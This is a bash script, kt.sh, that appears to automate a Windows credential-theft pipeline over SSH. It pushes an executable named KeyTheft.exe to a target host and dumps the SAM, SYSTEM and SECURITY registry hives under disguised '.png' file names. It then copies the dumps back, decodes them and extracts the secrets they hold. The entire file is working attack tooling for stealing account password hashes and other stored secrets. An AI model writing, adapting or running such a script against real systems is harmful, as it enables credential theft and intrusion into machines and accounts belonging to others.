#!/usr/bin/env bash
# kt.sh - KeyTheft capture-to-secrets pipeline over SSH
# usage: kt.sh user@host [--sec] [--out DIR] [--skip-dump] [--pack none]
set -euo pipefail

KEY="${KT_SSH_KEY:-$HOME/.ssh/comrace_winvm}"
EXE="${KT_EXE:-$(dirname "$(readlink -f "$0")")/KeyTheft.exe}"
EXE="$(readlink -f "$EXE")"
PY="${KT_PY:-python3}"
OUT="kt-out"
SEC=0
SKIPDUMP=0
PACK=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --sec) SEC=1; shift ;;
        --out) OUT="$2"; shift 2 ;;
        --skip-dump) SKIPDUMP=1; shift ;;
        --pack) PACK=" --pack $2"; shift 2 ;;
        *) TARGET="$1"; shift ;;
    esac
done

[[ -z "${TARGET:-}" ]] && { echo "usage: kt.sh user@host [--sec] [--out DIR] [--skip-dump] [--pack none]"; exit 3; }
SSH="ssh -i $KEY -o BatchMode=yes -o ConnectTimeout=10"
SCP="scp -q -i $KEY -o BatchMode=yes"
HIVES="sam system"

mkdir -p "$OUT"
cd "$OUT"

if [[ $SKIPDUMP -eq 0 ]]; then
    echo "[*] pushing KeyTheft.exe to $TARGET"
    $SCP "$EXE" "$TARGET:KeyTheft.exe"
    $SCP "$(dirname "$EXE")/decode.py" "$(dirname "$EXE")/sam_extract.py" "$TARGET:" 2>/dev/null || true

    echo "[*] dumping hives on $TARGET"
    HIVEARGS="sam.png system.png"
    [[ $SEC -eq 1 ]] && HIVEARGS="sam.png system.png security.png"
    $SSH "$TARGET" "KeyTheft.exe $HIVEARGS$PACK"
fi

echo "[*] pulling artifacts"
FILES="sam.png system.png"
[[ $SEC -eq 1 ]] && FILES="$FILES security.png"
for f in $FILES; do
    $SCP "$TARGET:$f" .
    K=$($SSH "$TARGET" "type $f.key" 2>/dev/null | tr -d '\r\n \0')
    [[ -z "$K" ]] && K=$(tr -d '\r\n \0' < "$f.key")
    echo "[*] decoding $f (key $K)"
    "$PY" "$(dirname "$EXE")/decode.py" "$K" "$f"
    rm -f "$f.key"
done

echo "[*] extracting secrets"
HIVARGS="sam.hiv system.hiv"
[[ $SEC -eq 1 ]] && HIVARGS="sam.hiv system.hiv security.hiv"
"$PY" "$(dirname "$EXE")/sam_extract.py" $HIVARGS

echo "[+] artifacts in $OUT/"
